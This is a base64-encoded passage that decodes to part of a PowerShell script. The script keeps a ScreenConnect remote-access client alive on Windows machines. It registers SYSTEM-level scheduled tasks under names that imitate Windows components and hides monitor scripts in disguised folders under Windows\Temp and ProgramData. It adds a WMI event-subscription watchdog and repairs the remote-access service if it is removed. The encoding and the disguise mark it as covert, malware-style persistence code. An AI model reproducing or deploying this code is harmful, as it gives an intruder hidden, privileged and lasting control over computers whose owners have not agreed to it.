S19DID0gJ1dkaUhvc3RQcm94eScKICAgIFRBU0tfRCA9ICdUY3BJcENvbmZsaWN0UmVzJwogICAg
TU9fQSAgID0gJzInCiAgICBNT19CICAgPSAnMycKfQoKZnVuY3Rpb24gR2V0LUhvc3RTZWVkIHsK
ICAgICRzID0gMEwKICAgIGZvcmVhY2ggKCRjIGluICRlbnY6Q09NUFVURVJOQU1FLlRvVXBwZXIo
KS5Ub0NoYXJBcnJheSgpKSB7ICRzID0gKCRzICogMzEgKyBbaW50XSRjKSAlIDEwMDAwMDAwMDcg
fQogICAgcmV0dXJuICRzCn0KCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgewogICAgJGlkID0gJERl
ZmF1bHRzLkNsb25lKCkKICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICBmb3Jl
YWNoICgkbGluZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkp
IHsKICAgICAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/
KVxzKiQnKSB7ICRpZFskbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9CiAgICAgICAgfQogICAg
fQogICAgcmV0dXJuICRpZAp9CgpmdW5jdGlvbiBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRu
KSB7CiAgICBpZiAoJHRuKSB7ICYgc2NodGFza3MuZXhlIC9EZWxldGUgL1ROICR0biAvRiAyPiYx
IHwgT3V0LU51bGwgfQp9CgpmdW5jdGlvbiBHZXQtVGFza1ZlcmJvc2VCbG9iKFtzdHJpbmddJHRu
KSB7CiAgICBpZiAoLW5vdCAkdG4pIHsgcmV0dXJuICcnIH0KICAgICRvdXQgPSAmIHNjaHRhc2tz
LmV4ZSAvUXVlcnkgL1ROICR0biAvRk8gTElTVCAvViAyPiRudWxsCiAgICBpZiAoJExBU1RFWElU
Q09ERSAtbmUgMCAtb3IgLW5vdCAkb3V0KSB7IHJldHVybiAnJyB9CiAgICByZXR1cm4gKCgkb3V0
IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0pIC1qb2luICJgbiIpCn0KCmZ1bmN0aW9uIFRlc3Qt
VGFza093bnNNb24oW3N0cmluZ10kdG4sIFtzdHJpbmddJG1hcmtlcikgewogICAgIyBUcnVlIG9u
bHkgaWYgdGhlIHNjaGVkdWxlZCBhY3Rpb24gcG9pbnRzIGF0IE9VUiBtb24vZXRsIHBhdGgg4oCU
IG5vdCBhIFdpbmRvd3MgQ09NIGhhbmRsZXIuCiAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJs
b2IgJHRuCiAgICBpZiAoLW5vdCAkYmxvYikgeyByZXR1cm4gJGZhbHNlIH0KICAgIGlmICgkbWFy
a2VyIC1hbmQgKCRibG9iIC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJG1hcmtlcikpKSB7IHJldHVy
biAkdHJ1ZSB9CiAgICBpZiAoJGJsb2IgLW1hdGNoICcoP2kpXC53dWNhY2hlXFx8b3duX21vblwu
Y21kfGV0bF9tb25cLmNtZHxcLmV0bGNhY2hlXFwnKSB7IHJldHVybiAkdHJ1ZSB9CiAgICByZXR1
cm4gJGZhbHNlCn0KCmZ1bmN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgewogICAgIyBJZGVtcG90
ZW50IHdpdGhpbiBhbiBJREVOVFZFUiBnZW5lcmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURF
TlRWRVI6CiAgICAjIG93bmVkIG9sZC1uYW1lIHRhc2tzIGFyZSBkZWxldGVkOyBXaW5kb3dzIGJ1
aWx0LWlucyB3aXRoIHNhbWUgbmFtZSBhcmUgbGVmdCBhbG9uZS4KICAgIGlmIChUZXN0LVBhdGgg
JGNmZ1BhdGgpIHsKICAgICAgICAkb2xkID0gUmVhZC1JZGVudGl0eQogICAgICAgICMgTDc6IGFs
c28gcmVnZW5lcmF0ZSBpZiBhbnkgVEFTS18qIGlzIGVtcHR5IChMNC1MNiBtb2R1bG8vY2FzdCBi
dWdzIGxlZnQgYmxhbmsgc2xvdHMpCiAgICAgICAgJHNsb3RzT2sgPSAoJG9sZFsnSURFTlRWRVIn
XSAtZXEgIiRJZGVudFZlcnNpb24iKSAtYW5kICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFT
S19CJ10gLWFuZCAkb2xkWydUQVNLX0MnXSAtYW5kICRvbGRbJ1RBU0tfRCddCiAgICAgICAgaWYg
KCRzbG90c09rKSB7IHJldHVybiAkb2xkIH0KICAgICAgICBmb3JlYWNoICgkayBpbiAnVEFTS19B
JywnVEFTS19CJywnVEFTS19DJywnVEFTS19EJykgewogICAgICAgICAgICAkdG4gPSBbc3RyaW5n
XSRvbGRbJGtdCiAgICAgICAgICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAg
ICAgICMgTmV2ZXIgZGVsZXRlIGEgcmVhbCBXaW5kb3dzIHRhc2sgd2UgbmV2ZXIgb3duZWQgKFRS
IGlzIENPTS9jdXN0b20gaGFuZGxlcikuCiAgICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9u
ICR0biAnJykgeyBSZW1vdmUtVGFza1F1aWV0ICR0biB9CiAgICAgICAgfQogICAgICAgIFJlbW92
ZS1JdGVtIC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2UKICAgIH0KICAgICRzID0gR2V0LUhv
c3RTZWVkCiAgICAjIEw0OiB0d28gc2xvdHMgbWF5IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRo
IChwb29scyBzaGFyZSBuYW1lcykgLT4KICAgICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRp
c2ZpZXMgdHdvIHNsb3RzIGFuZCB0aGUgZmxlZXQgc2hvd3MgMy80LgogICAgIyBXYWxrIGVhY2gg
cG9vbCBmb3J3YXJkIHVudGlsIHRoZSBwaWNrIGlzIHVuaXF1ZSBhY3Jvc3Mgc2xvdHMuCiAgICAj
IEw2OiB0aGUgb2xkIEAoQCgnQScsICRzICUgOCksIC4uLikgZm9ybSB3YXMgZG91YmxlLWJyb2tl
biBpbiBQUyA1LjE6CiAgICAjIGJhcmUgJSBpbnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFj
aC1PYmplY3QgYWxpYXMgKG5vdCBtb2R1bG8pLCBzbyB0aGUKICAgICMgY29sbGVjdGlvbiBjb2xs
YXBzZWQgYW5kIHRoZSBsb29wIG5ldmVyIHJhbiAtPiBpZGVudGl0eS5jZmcgaGFkIEVNUFRZCiAg
ICAjIFRBU0tfKiBhbmQgdGhlIHdob2xlIGZsZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVm
YXVsdCB0YXNrIG5hbWVzLgogICAgJHNlZWRzID0gW29yZGVyZWRdQHsKICAgICAgICBBID0gKCRz
ICUgOCkKICAgICAgICBCID0gKCgkcyArIDMpICUgOCkKICAgICAgICBDID0gKCgkcyArIDUpICUg
OCkKICAgICAgICBEID0gKCgkcyArIDcpICUgOCkKICAgIH0KICAgICRwaWNrID0gW29yZGVyZWRd
QHt9CiAgICBmb3JlYWNoICgkbGV0dGVyIGluICdBJywnQicsJ0MnLCdEJykgewogICAgICAgICRp
ID0gW2ludF0kc2VlZHNbJGxldHRlcl0KICAgICAgICAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVsk
aV0KICAgICAgICAkbiA9IDAKICAgICAgICB3aGlsZSAoJHBpY2suVmFsdWVzIC1jb250YWlucyAk
bmFtZSAtYW5kICRuIC1sdCA4KSB7ICRpID0gKCRpICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1sk
bGV0dGVyXVskaV07ICRuKysgfQogICAgICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERl
ZmF1bHRzWyJUQVNLXyRsZXR0ZXIiXSB9CiAgICAgICAgJHBpY2tbJGxldHRlcl0gPSAkbmFtZQog
ICAgfQogICAgJGNmZyA9IEAoCiAgICAgICAgIlRBU0tfQT0kKCRwaWNrLkEpIgogICAgICAgICJU
QVNLX0I9JCgkcGljay5CKSIKICAgICAgICAiVEFTS19DPSQoJHBpY2suQykiCiAgICAgICAgIlRB
U0tfRD0kKCRwaWNrLkQpIgogICAgICAgICJNT19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAg
IyAyLTUgbWluIGppdHRlcgogICAgICAgICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAg
IyAzLTUgbWluIGppdHRlcgogICAgICAgICJTRUVEPSRzIgogICAgICAgICJJREVOVFZFUj0kSWRl
bnRWZXJzaW9uIgogICAgKQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1W
YWx1ZSAkY2ZnIC1Gb3JjZQogICAgcmV0dXJuIChSZWFkLUlkZW50aXR5KQp9CgpmdW5jdGlvbiBO
b3JtYWxpemUtVGFza05hbWUoW3N0cmluZ10kdG4pIHsKICAgIGlmICgtbm90ICR0bikgeyByZXR1
cm4gJycgfQogICAgcmV0dXJuICR0bi5UcmltKCkuVHJpbVN0YXJ0KCdcJykKfQoKZnVuY3Rpb24g
V3JpdGUtT3duTG9nKFtzdHJpbmddJG0pIHsKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIg
J2Jvb3QuZXJyJwogICAgdHJ5IHsgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVl
ICRtIC1Gb3JjZSB9IGNhdGNoIHt9Cn0KCmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3Mgewog
ICAgIyBNaXJyb3Igd29ya2luZyBkZXRhY2ggKFd1Y2FjaGVPd24pOiBjbWQgc2NodGFza3MsIEJP
T1QgVFIgcGF0aCwgL1NUIG9uIE1JTlVURS4KICAgICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHkK
ICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdv
d25fbW9uLmNtZCcgfQogICAgJGJvb3QgPSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdUZW1w
XC53dWNhY2hlJwogICAgJGV0bERpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25v
c2lzXFN0YXRlXC5ldGxjYWNoZScKICAgIGZvcmVhY2ggKCRkIGluIEAoJGJvb3QsICRldGxEaXIp
KSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IE5ldy1J
dGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGQgLUZvcmNlIHwgT3V0LU51bGwgfQogICAg
fQogICAgJGJvb3RNb24gPSBKb2luLVBhdGggJGJvb3QgJ293bl9tb24uY21kJwogICAgJGJvb3RF
dGwgPSBKb2luLVBhdGggJGJvb3QgJ2V0bF9tb24uY21kJwogICAgJGV0bE1vbiA9IEpvaW4tUGF0
aCAkZXRsRGlyICdldGxfbW9uLmNtZCcKICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRN
b25QYXRoKSB7CiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGlu
YXRpb24gJGJvb3RNb24gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAg
ICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJvb3RFdGwg
LUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1JdGVtIC1M
aXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGV0bE1vbiAtRm9yY2UgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KICAgICMgQk9PVCBpcyBub3QgTG9ja0RpcidkIGJ5
IG93bl9zZWN1cmUg4oCUIFRhc2sgU2NoZWR1bGVyIGNhbiByZXNvbHZlIFRSIHRoZXJlLgogICAg
JHRyTW9uID0gImNtZC5leGUgL2MgJGJvb3RNb24iCiAgICAkdHJFdGwgPSAiY21kLmV4ZSAvYyAk
Ym9vdEV0bCIKICAgICRtb0EgPSBbc3RyaW5nXSRpZFsnTU9fQSddOyBpZiAoLW5vdCAkbW9BKSB7
ICRtb0EgPSAnMicgfQogICAgJG1vQiA9IFtzdHJpbmddJGlkWydNT19CJ107IGlmICgtbm90ICRt
b0IpIHsgJG1vQiA9ICczJyB9CiAgICAkc3QgPSAoR2V0LURhdGUpLlRvU3RyaW5nKCdISDptbScp
CiAgICAkc3BlY3MgPSBAKAogICAgICAgIEB7IEtleSA9ICdUQVNLX0EnOyBNYXJrZXIgPSAnb3du
X21vbi5jbWQnOyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0E7IFRyID0gJHRyTW9uIH0KICAgICAg
ICBAeyBLZXkgPSAnVEFTS19CJzsgTWFya2VyID0gJ2V0bF9tb24uY21kJzsgU2MgPSAnTUlOVVRF
JzsgTW8gPSAkbW9COyBUciA9ICR0ckV0bCB9CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQyc7IE1h
cmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ09OU1RBUlQnOyBNbyA9ICcnOyBUciA9ICR0ck1v
biB9CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfRCc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNj
ID0gJ09OTE9HT04nOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9CiAgICApCiAgICAkb2sgPSAwOyAk
cmVhcm1lZCA9IDA7ICRmYWlsID0gMAogICAgZm9yZWFjaCAoJHNwIGluICRzcGVjcykgewogICAg
ICAgICR0biA9IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10kaWRbJHNwLktleV0pCiAgICAg
ICAgaWYgKC1ub3QgJHRuKSB7ICRmYWlsKys7IGNvbnRpbnVlIH0KICAgICAgICBpZiAoVGVzdC1U
YXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgeyAkb2srKzsgY29udGludWUgfQogICAgICAgIGlm
IChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVl
IH0KICAgICAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAgICAgICAgaWYgKC1u
b3QgJGJsb2IpIHsgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICgiXCR0biIpIH0KICAgICAg
ICBpZiAoJGJsb2IpIHsKICAgICAgICAgICAgJG91cnNCcm9rZW4gPSAoJGJsb2IgLW1hdGNoICco
P2kpb3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQog
ICAgICAgICAgICBpZiAoLW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25Mb2cg
InRhc2tzX3NraXBfZm9yZWlnbiAkdG4iOyBjb250aW51ZSB9CiAgICAgICAgICAgIFJlbW92ZS1U
YXNrUXVpZXQgJHRuCiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQgKCJcJHRuIikKICAgICAg
ICB9CiAgICAgICAgIyBCdWlsZCBjbWRsaW5lIGV4YWN0bHkgbGlrZSBvd24uY21kIGRldGFjaCAo
cHJvdmVuIHRvIHdvcmsgYXMgU1lTVEVNKS4KICAgICAgICAkcGFydHMgPSBAKAogICAgICAgICAg
ICAnL0NyZWF0ZScsICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdISUdIRVNU
JywgJy9GJywKICAgICAgICAgICAgJy9UUicsICRzcC5UciwgJy9TQycsICRzcC5TYwogICAgICAg
ICkKICAgICAgICBpZiAoJHNwLlNjIC1lcSAnTUlOVVRFJykgewogICAgICAgICAgICAkcGFydHMg
Kz0gQCgnL01PJywgJHNwLk1vLCAnL1NUJywgJHN0KQogICAgICAgIH0KICAgICAgICAkYXJnTGlu
ZSA9ICgkcGFydHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2gg
J1tccyJdJykgeyAnInswfSInIC1mICgkXyAtcmVwbGFjZSAnIicsICdcIicpIH0gZWxzZSB7ICRf
IH0KICAgICAgICB9KSAtam9pbiAnICcKICAgICAgICAkY3JlYXRlVHh0ID0gY21kLmV4ZSAvYyAi
c2NodGFza3MuZXhlICRhcmdMaW5lIiAyPiYxIHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0KICAg
ICAgICAkY3JlYXRlSm9pbmVkID0gKCRjcmVhdGVUeHQgLWpvaW4gJyAnKS5UcmltKCkKICAgICAg
ICBXcml0ZS1Pd25Mb2cgInRhc2tzX2NyZWF0ZSAkKCRzcC5LZXkpICR0biA9PiAkY3JlYXRlSm9p
bmVkIgogICAgICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgLW9yIChU
ZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpKSB7CiAgICAgICAgICAgICRyZWFy
bWVkKysKICAgICAgICAgICAgaWYgKCRzcC5LZXkgLWVxICdUQVNLX0EnIC1vciAkc3AuS2V5IC1l
cSAnVEFTS19CJykgewogICAgICAgICAgICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9S
dW4gL1ROIGAiJHRuYCIiIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7
CiAgICAgICAgICAgICRmYWlsKysKICAgICAgICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVh
dGVfRkFJTCAkKCRzcC5LZXkpICR0biIKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gInRhc2tz
IG9rPSRvayByZWFybWVkPSRyZWFybWVkIGZhaWw9JGZhaWwiCn0KCmZ1bmN0aW9uIFJlbW92ZS1X
YXRjaGRvZyB7CiAgICBmb3JlYWNoICgkY2xzIGluIEAoJ19fRmlsdGVyVG9Db25zdW1lckJpbmRp
bmcnLCdfX0V2ZW50RmlsdGVyJywnQ29tbWFuZExpbmVFdmVudENvbnN1bWVyJywnX19JbnRlcnZh
bFRpbWVySW5zdHJ1Y3Rpb24nKSkgewogICAgICAgIEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSBy
b290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgJGNscyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7CiAgICAgICAgICAgICAgICAoJF8uTmFtZSAt
ZXEgJ1d1Y2FjaGVXYXRjaGRvZ0YnKSAtb3IgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dD
JykgLW9yCiAgICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2FjaGVXYXRjaGRvZycp
IC1vcgogICAgICAgICAgICAgICAgKCRfLkZpbHRlciAtYW5kICRfLkZpbHRlci5Ub1N0cmluZygp
IC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRionKSAtb3IKICAgICAgICAgICAgICAgICgkXy5Db25z
dW1lciAtYW5kICRfLkNvbnN1bWVyLlRvU3RyaW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dD
KicpCiAgICAgICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0LU51
bGwgfQogICAgfQp9CgpmdW5jdGlvbiBJbnN0YWxsLVdhdGNoZG9nIHsKICAgIGlmICgtbm90ICRN
b25QYXRoKSB7IHJldHVybiAkZmFsc2UgfQogICAgUmVtb3ZlLVdhdGNoZG9nCiAgICAkb2sgPSAk
dHJ1ZQogICAgdHJ5IHsKICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1
YnNjcmlwdGlvbiAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYAogICAgICAgICAg
ICAtQXJndW1lbnRzIEB7IFRpbWVySWQgPSAnV3VjYWNoZVdhdGNoZG9nJzsgSW50ZXJ2YWxNaWxs
aXNlY29uZHMgPSAxODAwMDA7IFNraXBJZlBhc3NlZCA9ICRmYWxzZSB9IHwgT3V0LU51bGwKICAg
ICAgICAkZiA9IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1D
bGFzcyBfX0V2ZW50RmlsdGVyIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1
Y2FjaGVXYXRjaGRvZ0YnOyBFdmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5n
dWFnZSA9ICdXUUwnOwogICAgICAgICAgICAgICAgICAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAq
IEZST00gX19UaW1lckV2ZW50IFdIRVJFIFRpbWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0KICAg
ICAgICAkYyA9IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1D
bGFzcyBDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7
IE5hbWUgPSAnV3VjYWNoZVdhdGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4
ZSAvYyBgIiRNb25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0KICAgICAgICBT
ZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0
ZXJUb0NvbnN1bWVyQmluZGluZyBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgRmlsdGVyID0g
JGY7IENvbnN1bWVyID0gJGMgfSB8IE91dC1OdWxsCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNl
IH0KICAgIHJldHVybiAkb2sKfQoKZnVuY3Rpb24gVGVzdC1XYXRjaGRvZ0dyYXBoIHsKICAgICR0
ID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0lu
dGVydmFsVGltZXJJbnN0cnVjdGlvbiAtRmlsdGVyICJUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cn
IiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1O
YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAi
TmFtZT0nV3VjYWNoZVdhdGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAg
ICAkYyA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3Mg
Q29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0Mn
IiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGIgPSAkbnVsbAogICAgaWYgKCRm
IC1hbmQgJGMpIHsKICAgICAgICAkYiA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1
YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkZpbHRlciAt
bGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJyAtYW5kICRfLkNvbnN1bWVyIC1saWtlICcqV3VjYWNo
ZVdhdGNoZG9nQyonIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICB9
CiAgICByZXR1cm4gW2Jvb2xdKCR0IC1hbmQgJGYgLWFuZCAkYyAtYW5kICRiKQp9CgpmdW5jdGlv
biBFbnN1cmUtV2F0Y2hkb2cgewogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkgeyByZXR1cm4g
J09LJyB9CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJ01JU1NJTkcnIH0KICAgIGlm
IChJbnN0YWxsLVdhdGNoZG9nKSB7IHJldHVybiAnUkVBUk1FRCcgfQogICAgcmV0dXJuICdGQUlM
Jwp9CgojIENvcnJlY3QgMzItYml0ICsgNjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIg
dXNlZCBhIHRydW5jYXRlZAojIFdPVzY0MzJOb2RlIHBhdGggKG1pc3NpbmcgTWljcm9zb2Z0XFdp
bmRvd3MpIHNvIEVWRVJZIDMyLWJpdCBTQyBwcm9kdWN0CiMgd2FzIGludmlzaWJsZSB0byByZXBh
aXIvZXh0ZXJtaW5hdGUvcmVnaXN0ZXJlZC4KJHNjcmlwdDpVbmluc3RhbGxSb290cyA9IEAoCiAg
ICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0
YWxsJywKICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xD
dXJyZW50VmVyc2lvblxVbmluc3RhbGwnCikKCmZ1bmN0aW9uIFRlc3QtU0NSZWdpc3RlcmVkKFtz
dHJpbmddJEZpbmdlcnByaW50KSB7CiAgICAjIEw4OiBORVZFUiB1c2UgcmV0dXJuIGluc2lkZSBG
b3JFYWNoLU9iamVjdCAtIGl0IG9ubHkgZXhpdHMgdGhlCiAgICAjIHBpcGVsaW5lIGl0ZXJhdGlv
biwgc28gdGhpcyBmdW5jdGlvbiBhbHdheXMgZmVsbCB0aHJvdWdoIHRvICdubycKICAgICMgYW5k
IHRoZSBtb24gb3JwaGFuLWxhZGRlciBkZWxldGVkIGhlYWx0aHkgcmVnaXN0ZXJlZCBzZXJ2aWNl
cy4KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9CiAgICAkbmFtZSA9
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgIGZvcmVhY2ggKCRyb290
IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRo
ICRyb290KSkgeyBjb250aW51ZSB9CiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxk
SXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAg
JGRuID0gKEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRuIC1pZXEg
JG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAneWVz
JyB9CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICdubycKfQoKZnVuY3Rpb24gUmVwYWlyLVND
U2VydmljZShbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBSZWNyZWF0ZXMgYSBkZWxldGVk
IFNDIHNlcnZpY2UgZW50cnkgYnkgcmVwYWlyaW5nIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3QuCiAg
ICAjIG1zaWV4ZWMgL2ZhIHtHVUlEfSByZXBhaXJzIGluIHBsYWNlIC0gaXQgZG9lcyBOT1QgcnVu
IHRoZSBTQy1mYW1pbHkKICAgICMgbWFqb3ItdXBncmFkZSByZW1vdmFsLCBzbyBvdGhlciBpbnN0
YW5jZXMgYXJlIHVudG91Y2hlZC4KICAgICMgTDU6IGFsc28gaGFuZGxlcyBwcmVzZW50LWJ1dC1T
VE9QUEVEIHNlcnZpY2VzIChyZXBhaXIgcmVzdG9yZXMgYmluYXJpZXMsCiAgICAjIHRoZW4gc3Rh
cnQpLiBPbmx5IGEgUnVubmluZyBzZXJ2aWNlIGlzIGNvbnNpZGVyZWQgaGVhbHRoeS4KICAgIGlm
ICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9CiAgICAkbmFtZSA9ICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICRzdmMgPSBHZXQtU2VydmljZSAt
TmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgaWYgKCRzdmMgLWFu
ZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJ1bm5pbmcnIH0KICAg
